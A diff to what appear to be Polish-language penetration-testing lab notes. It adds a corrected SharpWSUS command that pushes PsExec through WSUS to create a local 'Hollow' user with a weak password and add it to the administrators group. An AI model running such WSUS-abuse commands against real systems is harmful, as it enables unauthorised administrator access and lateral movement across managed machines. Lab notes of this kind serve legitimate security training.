@@ -183,5 +183,14 @@ jakoś po minucie mamy tutaj update
 
 po kolejnych 3 minutach nie widzimy naszego usera :(
 
+- poczekałem do 10 i znalazłem literówkę w payloadzie.
+
+```
+sharpwsus.exe create /payload:"C:\_install\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c \\"net user Hollow Password1! /add && net localgroup administrators Hollow /add\\""
+```
+
+![{C5DD6CC9-8BB9-43C6-A04C-5609DD04F5A6}](https://github.com/user-attachments/assets/2dcd0d43-e509-4b13-9ade-1501b61ba896)
+
+teraz mamy 1/4, a nie 1/3. Zawsze jakaś zmiana xD
 
 
